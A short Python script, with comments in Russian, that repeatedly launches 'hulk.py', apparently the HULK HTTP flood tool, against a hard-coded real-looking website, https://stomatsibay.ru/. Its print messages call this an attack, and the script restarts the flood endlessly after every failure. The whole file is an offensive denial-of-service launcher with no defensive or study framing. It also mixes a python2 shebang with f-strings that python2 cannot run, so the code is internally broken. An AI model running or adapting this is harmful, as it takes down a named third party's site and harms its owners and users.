#!/usr/bin/env python2
import subprocess
import time
import sys

# Конфигурация
HULK_SCRIPT = "hulk.py"
TARGET_URL = "https://stomatsibay.ru/"
DELAY_ON_FAILURE = 1  # Пауза при падении скрипта (в секундах)
MAX_RESTARTS = 0  # Максимальное число перезапусков (0 = бесконечно)

def run_hulk():
    command = ["python2", HULK_SCRIPT, TARGET_URL]
    try:
        print(f"[+] Запускаем атаку: {' '.join(command)}")
        process = subprocess.Popen(command)
        return process.wait()  # Ждем завершения процесса
    except KeyboardInterrupt:
        print("\n[!] Остановлено пользователем")
        return 0
    except Exception as e:
        print(f"[!] Ошибка: {str(e)}")
        return 1

def main():
    restarts = 0
    
    while True:
        exit_code = run_hulk()
        
        if MAX_RESTARTS > 0:
            restarts += 1
            if restarts >= MAX_RESTARTS:
                print("[!] Достигнут лимит перезапусков")
                break
        
        print(f"[!] Скрипт упал с кодом {exit_code}, перезапуск через {DELAY_ON_FAILURE} сек...")
        time.sleep(DELAY_ON_FAILURE)

if __name__ == "__main__":
    main()